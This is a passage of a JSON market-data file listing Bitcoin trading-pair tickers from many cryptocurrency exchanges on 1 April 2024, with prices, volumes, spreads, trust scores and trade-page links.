            ""timestamp"": ""2024-04-01T02:10:01+00:00"",
            ""last_traded_at"": ""2024-04-01T02:10:01+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:00+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://pro.kraken.com/app/trade/BTC-USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Dex-Trade"",
                ""identifier"": ""dextrade"",
                ""has_trading_incentive"": false
            },
            ""last"": 70813.19,
            ""volume"": 255.38275595,
            ""converted_last"": {
                ""btc"": 0.99929921,
                ""eth"": 19.613085,
                ""usd"": 70798
            },
            ""converted_volume"": {
                ""btc"": 255.204,
                ""eth"": 5009,
                ""usd"": 18080504
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.017484,
            ""timestamp"": ""2024-04-01T02:09:12+00:00"",
            ""last_traded_at"": ""2024-04-01T02:09:12+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:09:12+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://dex-trade.com/spot/trading/BTCUSDT?interface=classic"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""KuCoin"",
                ""identifier"": ""kucoin"",
                ""has_trading_incentive"": false
            },
            ""last"": 70814.1,
            ""volume"": 1230.1119406,
            ""converted_last"": {
                ""btc"": 0.99927637,
                ""eth"": 19.615078,
                ""usd"": 70801
            },
            ""converted_volume"": {
                ""btc"": 1229,
                ""eth"": 24129,
                ""usd"": 87092946
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010141,
            ""timestamp"": ""2024-04-01T02:12:38+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:38+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:38+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.kucoin.com/trade/BTC-USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Toobit"",
                ""identifier"": ""toobit"",
                ""has_trading_incentive"": false
            },
            ""last"": 70879.26,
            ""volume"": 2747.841899,
            ""converted_last"": {
                ""btc"": 1.000111,
                ""eth"": 19.635245,
                ""usd"": 70850
            },
            ""converted_volume"": {
                ""btc"": 2738,
                ""eth"": 53757,
                ""usd"": 193969555
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010367,
            ""timestamp"": ""2024-04-01T02:02:21+00:00"",
            ""last_traded_at"": ""2024-04-01T02:02:21+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:02:21+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.toobit.com/en-US/spot/BTC_USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""EUR"",
            ""market"": {
                ""name"": ""Bitvavo"",
                ""identifier"": ""bitvavo"",
                ""has_trading_incentive"": false
            },
            ""last"": 65698.0,
            ""volume"": 416.66585556,
            ""converted_last"": {
                ""btc"": 1.000097,
                ""eth"": 19.631177,
                ""usd"": 70859
            },
            ""converted_volume"": {
                ""btc"": 416.706,
                ""eth"": 8180,
                ""usd"": 29524501
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.014568,
            ""timestamp"": ""2024-04-01T02:12:32+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:32+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:32+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://account.bitvavo.com/markets/BTC-EUR"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""BingX"",
                ""identifier"": ""bingx"",
                ""has_trading_incentive"": false
            },
            ""last"": 70822.4,
            ""volume"": 3362.232133,
            ""converted_last"": {
                ""btc"": 0.9993935,
                ""eth"": 19.617377,
                ""usd"": 70809
            },
            ""converted_volume"": {
                ""btc"": 3349,
                ""eth"": 65737,
                ""usd"": 237277988
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.012005,
            ""timestamp"": ""2024-04-01T02:12:32+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:32+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:32+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://bingx.com/en-us/spot/BTCUSDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDC"",
            ""market"": {
                ""name"": ""OKX"",
                ""identifier"": ""okex"",
                ""has_trading_incentive"": false
            },
            ""last"": 70863.2,
            ""volume"": 497.10239899,
            ""converted_last"": {
                ""btc"": 1.000158,
                ""eth"": 19.632382,
                ""usd"": 70863
            },
            ""converted_volume"": {
                ""btc"": 496.012,
                ""eth"": 9736,
                ""usd"": 35143519
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010141,
            ""timestamp"": ""2024-04-01T02:12:00+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:00+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:00+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.okx.com/trade-spot/btc-usdc"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""usd-coin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""WhiteBIT"",
                ""identifier"": ""whitebit"",
                ""has_trading_incentive"": false
            },
            ""last"": 70814.06,
            ""volume"": 1741.808518,
            ""converted_last"": {
                ""btc"": 0.99931149,
                ""eth"": 19.613326,
                ""usd"": 70799
            },
            ""converted_volume"": {
                ""btc"": 1741,
                ""eth"": 34163,
                ""usd"": 123317502
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:09:26+00:00"",
            ""last_traded_at"": ""2024-04-01T02:09:26+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:09:26+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://whitebit.com/trade/BTC_USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDC"",
            ""market"": {
                ""name"": ""BingX"",
                ""identifier"": ""bingx"",
                ""has_trading_incentive"": false
            },
            ""last"": 70848.26,
            ""volume"": 335.5491,
            ""converted_last"": {
                ""btc"": 0.99994707,
                ""eth"": 19.628243,
                ""usd"": 70848
            },
            ""converted_volume"": {
                ""btc"": 334.287,
                ""eth"": 6562,
                ""usd"": 23684954
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.012003,
            ""timestamp"": ""2024-04-01T02:12:33+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:33+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:33+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://bingx.com/en-us/spot/BTCUSDC"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""usd-coin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""OrangeX"",
                ""identifier"": ""orangex"",
                ""has_trading_incentive"": false
            },
            ""last"": 70860.326,
            ""volume"": 10007.49748,
            ""converted_last"": {
                ""btc"": 0.99984403,
                ""eth"": 19.63,
                ""usd"": 70846
            },
            ""converted_volume"": {
                ""btc"": 9976,
                ""eth"": 195853,
                ""usd"": 706850347
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010058,
            ""timestamp"": ""2024-04-01T02:03:37+00:00"",
            ""last_traded_at"": ""2024-04-01T02:03:37+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:03:37+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.orangex.com/spot/BTC-USDT-SPOT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Pionex"",
                ""identifier"": ""pionex"",
                ""has_trading_incentive"": false
            },
            ""last"": 70809.27,
            ""volume"": 4091.85168,
            ""converted_last"": {
                ""btc"": 0.99917311,
                ""eth"": 19.613608,
                ""usd"": 70791
            },
            ""converted_volume"": {
                ""btc"": 4079,
                ""eth"": 80061,
                ""usd"": 288962126
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010042,
            ""timestamp"": ""2024-04-01T02:00:54+00:00"",
            ""last_traded_at"": ""2024-04-01T02:00:54+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:00:54+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.pionex.com/en/trade/BTC_USDT/Bot"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""CoinTR Pro"",
                ""identifier"": ""cointr"",
                ""has_trading_incentive"": false
            },
            ""last"": 70810.0,
            ""volume"": 2693.13225,
            ""converted_last"": {
                ""btc"": 0.99918341,
                ""eth"": 19.61381,
                ""usd"": 70792
            },
            ""converted_volume"": {
                ""btc"": 2682,
                ""eth"": 52655,
                ""usd"": 190046960
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010282,
            ""timestamp"": ""2024-04-01T02:00:43+00:00"",
            ""last_traded_at"": ""2024-04-01T02:00:43+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:00:43+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.cointr.com/en-us/spot/BTC_USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Biconomy"",
                ""identifier"": ""biconomy"",
                ""has_trading_incentive"": false
            },
            ""last"": 70824.75,
            ""volume"": 2151.67194,
            ""converted_last"": {
                ""btc"": 0.99942666,
                ""eth"": 19.618028,
                ""usd"": 70811
            },
            ""converted_volume"": {
                ""btc"": 2143,
                ""eth"": 42073,
                ""usd"": 151862236
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:12:25+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:25+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:25+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.biconomy.com/exchange/BTC_USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""AscendEX (BitMax)"",
                ""identifier"": ""bitmax"",
                ""has_trading_incentive"": false
            },
            ""last"": 70828.59,
            ""volume"": 994.2063,
            ""converted_last"": {
                ""btc"": 0.99948085,
                ""eth"": 19.619091,
                ""usd"": 70815
            },
            ""converted_volume"": {
                ""btc"": 993.69,
                ""eth"": 19505,
                ""usd"": 70405034
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.026182,
            ""timestamp"": ""2024-04-01T02:12:52+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:52+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:52+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://ascendex.com/en/cashtrade-spottrading/usdt/btc"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Bitexlive"",
                ""identifier"": ""bitexlive"",
                ""has_trading_incentive"": false
            },
            ""last"": 70813.2,
            ""volume"": 117.38931286760166,
            ""converted_last"": {
                ""btc"": 0.99929935,
                ""eth"": 19.613088,
                ""usd"": 70798
            },
            ""converted_volume"": {
                ""btc"": 117.307,
                ""eth"": 2302,
                ""usd"": 8310891
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:09:08+00:00"",
            ""last_traded_at"": ""2024-04-01T02:09:08+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:09:08+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://bitexlive.com/exchange/USDT-BTC"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USD"",
            ""market"": {
                ""name"": ""Bitstamp"",
                ""identifier"": ""bitstamp"",
                ""has_trading_incentive"": false
            },
            ""last"": 70883.0,
            ""volume"": 909.14012992,
            ""converted_last"": {
                ""btc"": 1.000436,
                ""eth"": 19.637843,
                ""usd"": 70883
            },
            ""converted_volume"": {
                ""btc"": 909.537,
                ""eth"": 17854,
                ""usd"": 64442580
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.050363,
            ""timestamp"": ""2024-04-01T02:10:28+00:00"",
            ""last_traded_at"": ""2024-04-01T02:10:28+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:00+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.bitstamp.net/markets/btc/usd/"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""DigiFinex"",
                ""identifier"": ""digifinex"",
                ""has_trading_incentive"": false
            },
            ""last"": 70823.93,
            ""volume"": 4544.60495,
            ""converted_last"": {
                ""btc"": 0.99941509,
                ""eth"": 19.617801,
                ""usd"": 70811
            },
            ""converted_volume"": {
                ""btc"": 4542,
                ""eth"": 89155,
                ""usd"": 321806466
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.022727,
            ""timestamp"": ""2024-04-01T02:12:46+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:46+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:46+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.digifinex.com/en-ww/trade/USDT/BTC"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDC"",
            ""market"": {
                ""name"": ""Binance"",
                ""identifier"": ""binance"",
                ""has_trading_incentive"": false
            },
            ""last"": 70860.89,
            ""volume"": 400.29083,
            ""converted_last"": {
                ""btc"": 1.000125,
                ""eth"": 19.631742,
                ""usd"": 70861
            },
            ""converted_volume"": {
                ""btc"": 399.185,
                ""eth"": 7836,
                ""usd"": 28283076
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:10:28+00:00"",
            ""last_traded_at"": ""2024-04-01T02:10:28+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:00+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.binance.com/en/trade/BTC_USDC?ref=37754157"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""usd-coin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""LBank"",
                ""identifier"": ""lbank"",
                ""has_trading_incentive"": false
            },
            ""last"": 70809.52,
            ""volume"": 3684.5906,
            ""converted_last"": {
                ""btc"": 0.99924742,
                ""eth"": 19.612069,
                ""usd"": 70794
            },
            ""converted_volume"": {
                ""btc"": 3682,
                ""eth"": 72262,
                ""usd"": 260846915
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:09:20+00:00"",
            ""last_traded_at"": ""2024-04-01T02:09:20+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:09:20+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.lbank.com/trade/btc_usdt"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""PointPay"",
                ""identifier"": ""pointpay"",
                ""has_trading_incentive"": false
            },
            ""last"": 70809.825202,
            ""volume"": 306.30124651,
            ""converted_last"": {
                ""btc"": 0.99918094,
                ""eth"": 19.613762,
                ""usd"": 70792
            },
            ""converted_volume"": {
                ""btc"": 305.329,
                ""eth"": 5994,
                ""usd"": 21632471
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.039992,
            ""timestamp"": ""2024-04-01T02:00:47+00:00"",
            ""last_traded_at"": ""2024-04-01T02:00:47+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:00:47+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://exchange.pointpay.io/trade-classic/BTC_USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""P2B"",
                ""identifier"": ""p2pb2b"",
                ""has_trading_incentive"": false
            },
            ""last"": 70847.27,
            ""volume"": 3900.345396,
            ""converted_last"": {
                ""btc"": 0.99978014,
                ""eth"": 19.622524,
                ""usd"": 70832
            },
            ""converted_volume"": {
                ""btc"": 3899,
                ""eth"": 76535,
                ""usd"": 276268266
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010593,
            ""timestamp"": ""2024-04-01T02:09:12+00:00"",
            ""last_traded_at"": ""2024-04-01T02:09:12+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:09:12+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": null,
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""XT.COM"",
                ""identifier"": ""xt"",
                ""has_trading_incentive"": false
            },
            ""last"": 70817.55,
            ""volume"": 2035.072214,
            ""converted_last"": {
                ""btc"": 0.99932506,
                ""eth"": 19.616033,
                ""usd"": 70804
            },
            ""converted_volume"": {
                ""btc"": 2028,
                ""eth"": 39814,
                ""usd"": 143708555
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:11:22+00:00"",
            ""last_traded_at"": ""2024-04-01T02:11:22+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:11:22+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.xt.com/en/trade/btc_usdt"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Nominex"",
                ""identifier"": ""nominex"",
                ""has_trading_incentive"": false
            },
            ""last"": 70827.12,
            ""volume"": 19.87818527086517,
            ""converted_last"": {
                ""btc"": 0.99942499,
                ""eth"": 19.618552,
                ""usd"": 70809
            },
            ""converted_volume"": {
                ""btc"": 19.866755,
                ""eth"": 389.981,
                ""usd"": 1407556
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:00:45+00:00"",
            ""last_traded_at"": ""2024-04-01T02:00:45+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:00:45+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://nominex.io/en/markets/BTC/USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""GBP"",
            ""market"": {
                ""name"": ""Kraken"",
                ""identifier"": ""kraken"",
                ""has_trading_incentive"": false
            },
            ""last"": 56078.7,
            ""volume"": 61.15047904,
            ""converted_last"": {
                ""btc"": 0.99946534,
                ""eth"": 19.618787,
                ""usd"": 70814
            },
            ""converted_volume"": {
                ""btc"": 61.118,
                ""eth"": 1200,
                ""usd"": 4330323
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.014441,
            ""timestamp"": ""2024-04-01T02:07:57+00:00"",
            ""last_traded_at"": ""2024-04-01T02:07:57+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:02+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://pro.kraken.com/app/trade/BTC-GBP"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""LATOKEN"",
                ""identifier"": ""latoken"",
                ""has_trading_incentive"": false
            },
            ""last"": 70826.71,
            ""volume"": 3019.3010617493046,
            ""converted_last"": {
                ""btc"": 0.99945432,
                ""eth"": 19.618571,
                ""usd"": 70813
            },
            ""converted_volume"": {
                ""btc"": 3018,
                ""eth"": 59234,
                ""usd"": 213807087
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.015041,
            ""timestamp"": ""2024-04-01T02:12:14+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:14+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:14+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://latoken.com/exchange/USDT-BTC"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""BitVenus"",
                ""identifier"": ""bitvenus_spot"",
                ""has_trading_incentive"": false
            },
            ""last"": 70859.52,
            ""volume"": 5907.99373,
            ""converted_last"": {
                ""btc"": 0.99983265,
                ""eth"": 19.629777,
                ""usd"": 70830
            },
            ""converted_volume"": {
                ""btc"": 5879,
                ""eth"": 115428,
                ""usd"": 416499354
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010014,
            ""timestamp"": ""2024-04-01T02:02:28+00:00"",
            ""last_traded_at"": ""2024-04-01T02:02:28+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:02:28+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.bitvenus.me/exchange/BTC/USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BNB"",
            ""target"": ""BTC"",
            ""market"": {
                ""name"": ""Binance"",
                ""identifier"": ""binance"",
                ""has_trading_incentive"": false
            },
            ""last"": 0.008532,
            ""volume"": 27090.7,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.637696,
                ""usd"": 70849
            },
            ""converted_volume"": {
                ""btc"": 232.499,
                ""eth"": 4566,
                ""usd"": 16472274
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.011736,
            ""timestamp"": ""2024-04-01T01:55:53+00:00"",
            ""last_traded_at"": ""2024-04-01T01:55:53+00:00"",
            ""last_fetch_at"": ""2024-04-01T01:55:53+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.binance.com/en/trade/BNB_BTC?ref=37754157"",
            ""token_info_url"": null,
            ""coin_id"": ""binancecoin"",
            ""target_coin_id"": ""bitcoin""
        },
        {
            ""base"": ""ETH"",
            ""target"": ""XBT"",
            ""market"": {
                ""name"": ""Kraken"",
                ""identifier"": ""kraken"",
                ""has_trading_incentive"": false
            },
            ""last"": 0.05097,
            ""volume"": 2467.04713094,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.629282,
                ""usd"": 70852
            },
            ""converted_volume"": {
                ""btc"": 125.745,
                ""eth"": 2468,
                ""usd"": 8909325
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.019619,
            ""timestamp"": ""2024-04-01T02:10:30+00:00"",
            ""last_traded_at"": ""2024-04-01T02:10:30+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:02+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://pro.kraken.com/app/trade/ETH-XBT"",
            ""token_info_url"": null,
            ""coin_id"": ""ethereum"",
            ""target_coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USD"",
            ""market"": {
                ""name"": ""P2B"",
                ""identifier"": ""p2pb2b"",
                ""has_trading_incentive"": false
            },
            ""last"": 70847.26,
            ""volume"": 3739.429971,
            ""converted_last"": {
                ""btc"": 0.99999915,
                ""eth"": 19.626823,
                ""usd"": 70847
            },
            ""converted_volume"": {
                ""btc"": 3739,
                ""eth"": 73393,
                ""usd"": 264928367
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.016298,
            ""timestamp"": ""2024-04-01T02:09:12+00:00"",
            ""last_traded_at"": ""2024-04-01T02:09:12+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:09:12+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": null,
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin""
        },
        {
            ""base"": ""ETH"",
            ""target"": ""BTC"",
            ""market"": {
                ""name"": ""DigiFinex"",
                ""identifier"": ""digifinex"",
                ""has_trading_incentive"": false
            },
            ""last"": 0.05095,
            ""volume"": 3433.9249,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.629282,
                ""usd"": 70852
            },
            ""converted_volume"": {
                ""btc"": 174.958,
                ""eth"": 3434,
                ""usd"": 12396175
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.039239,
            ""timestamp"": ""2024-04-01T02:12:46+00:00"",
            ""last_traded_at"": ""2024-04-01T02:12:46+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:46+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.digifinex.com/en-ww/trade/BTC/ETH"",
            ""token_info_url"": null,
            ""coin_id"": ""ethereum"",
            ""target_coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDC"",
            ""market"": {
                ""name"": ""PointPay"",
                ""identifier"": ""pointpay"",
                ""has_trading_incentive"": false
            },
            ""last"": 70843.97,
            ""volume"": 30.49112076,
            ""converted_last"": {
                ""btc"": 0.99987157,
                ""eth"": 19.627318,
                ""usd"": 70841
            },
            ""converted_volume"": {
                ""btc"": 30.431283,
                ""eth"": 597.361,
                ""usd"": 2156050
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.039992,
            ""timestamp"": ""2024-04-01T02:00:48+00:00"",
            ""last_traded_at"": ""2024-04-01T02:00:48+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:00:48+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://exchange.pointpay.io/trade-classic/BTC_USDC"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""usd-coin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""EUR"",
            ""market"": {
                ""name"": ""Bit2Me"",
                ""identifier"": ""bit2me"",
                ""has_trading_incentive"": false
            },
            ""last"": 65707.1,
            ""volume"": 345.0569086034,
            ""converted_last"": {
                ""btc"": 1.00049,
                ""eth"": 19.639868,
                ""usd"": 70876
            },
            ""converted_volume"": {
                ""btc"": 343.287,
                ""eth"": 6739,
                ""usd"": 24318722
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.010152,
            ""timestamp"": ""2024-04-01T02:01:00+00:00"",
            ""last_traded_at"": ""2024-04-01T02:01:00+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:01:00+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://pro.bit2me.com/exchange/BTC-EUR"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""Bit2Me"",
                ""identifier"": ""bit2me"",
                ""has_trading_incentive"": false
            },
            ""last"": 70816.0,
            ""volume"": 214.14072262099998,
            ""converted_last"": {
                ""btc"": 0.99926807,
                ""eth"": 19.615886,
                ""usd"": 70789
            },
            ""converted_volume"": {
                ""btc"": 212.812,
                ""eth"": 4178,
                ""usd"": 15075755
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.017904,
